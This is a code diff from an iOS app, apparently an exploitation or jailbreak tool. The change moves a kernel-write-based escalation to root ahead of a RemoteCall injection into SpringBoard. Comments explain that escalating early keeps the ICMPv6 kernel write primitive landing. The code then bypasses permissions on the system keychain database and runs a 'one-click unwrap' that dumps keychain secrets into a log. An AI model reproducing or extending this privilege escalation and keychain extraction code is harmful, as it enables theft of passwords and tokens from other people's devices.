@@ -203,51 +203,58 @@ struct lara: App {
         }
 
         let proceed = {
-            globallogger.log("(kc) initializing SpringBoard RemoteCall before keychain pipeline")
-            mgr.rcinit(process: "SpringBoard") { rcok in
-                guard rcok else {
-                    globallogger.log("(kc) skipped: SpringBoard RemoteCall unavailable")
-                    mgr.kcpipelineactive = false
-                    return
+            // The framework can only reach /private/var/Keychains/keychain-2.db
+            // if we bypass DAC: the DB is owned by _securityd (mode 0600), and a
+            // sandbox extension alone still yields errno=13. Rewriting our own
+            // ucred to uid 0 makes the framework's own fopen() succeed; the
+            // sandbox extension it already holds keeps the seatbelt layer happy.
+            //
+            // This has to happen BEFORE rcinit: once the SpringBoard RemoteCall
+            // has finished initializing, darksword's ICMPv6-socket kernel write
+            // primitive stops landing (setsockopt fails and the ucred uid field
+            // stays 501), so escalate while writes are still known-good.
+            var savedUids: [UInt32] = [0, 0, 0]
+            var rooted = false
+            DispatchQueue.global(qos: .userInitiated).async {
+                rooted = savedUids.withUnsafeMutableBufferPointer { buf -> Bool in
+                    sbx_rootify(buf.baseAddress) == 0
                 }
-                let registered = LaraKeychainSvc.registerSpringBoard(mgr.sbProc)
-                globallogger.log("(kc) registered SpringBoard RemoteCall: \(registered)")
-                DispatchQueue.global(qos: .userInitiated).async {
-                    // The framework can only reach /private/var/Keychains/keychain-2.db
-                    // if we bypass DAC: the DB is owned by _securityd (mode 0600), and a
-                    // sandbox extension alone still yields errno=13. Rewriting our own
-                    // ucred to uid 0 makes the framework's own fopen() succeed; the
-                    // sandbox extension it already holds keeps the seatbelt layer happy.
-                    var savedUids: [UInt32] = [0, 0, 0]
-                    let rooted = savedUids.withUnsafeMutableBufferPointer { buf -> Bool in
-                        sbx_rootify(buf.baseAddress) == 0
-                    }
-                    DispatchQueue.main.async {
-                        globallogger.log("(kc) uid-0 escalation before pipeline: \(rooted ? "ok" : "failed")")
-                    }
-
-                    var result: [AnyHashable: Any]?
-                    var failure: Error?
-                    do {
-                        result = try LaraKeychainSvc.runOneClickUnwrap(withMaxRows: 0)
-                    } catch {
-                        failure = error
-                    }
-
-                    if rooted {
-                        savedUids.withUnsafeBufferPointer { _ = sbx_unrootify($0.baseAddress) }
-                    }
-
-                    DispatchQueue.main.async {
-                        if let failure {
-                            globallogger.log("(kc) keychain pipeline failed: \(failure.localizedDescription)")
-                        } else {
-                            globallogger.log("(kc) keychain pipeline done: \(result ?? [:])")
+                DispatchQueue.main.async {
+                    globallogger.log("(kc) uid-0 escalation before rcinit: \(rooted ? "ok" : "failed")")
+                    globallogger.log("(kc) initializing SpringBoard RemoteCall before keychain pipeline")
+                    mgr.rcinit(process: "SpringBoard") { rcok in
+                        guard rcok else {
+                            globallogger.log("(kc) skipped: SpringBoard RemoteCall unavailable")
+                            mgr.kcpipelineactive = false
+                            return
                         }
-                        if rooted {
-                            globallogger.log("(kc) uid restored after pipeline")
+                        let registered = LaraKeychainSvc.registerSpringBoard(mgr.sbProc)
+                        globallogger.log("(kc) registered SpringBoard RemoteCall: \(registered)")
+                        DispatchQueue.global(qos: .userInitiated).async {
+                            var result: [AnyHashable: Any]?
+                            var failure: Error?
+                            do {
+                                result = try LaraKeychainSvc.runOneClickUnwrap(withMaxRows: 0)
+                            } catch {
+                                failure = error
+                            }
+
+                            if rooted {
+                                savedUids.withUnsafeBufferPointer { _ = sbx_unrootify($0.baseAddress) }
+                            }
+
+                            DispatchQueue.main.async {
+                                if let failure {
+                                    globallogger.log("(kc) keychain pipeline failed: \(failure.localizedDescription)")
+                                } else {
+                                    globallogger.log("(kc) keychain pipeline done: \(result ?? [:])")
+                                }
+                                if rooted {
+                                    globallogger.log("(kc) uid restored after pipeline")
+                                }
+                                mgr.kcpipelineactive = false
+                            }
                         }
-                        mgr.kcpipelineactive = false
                     }
                 }
             }
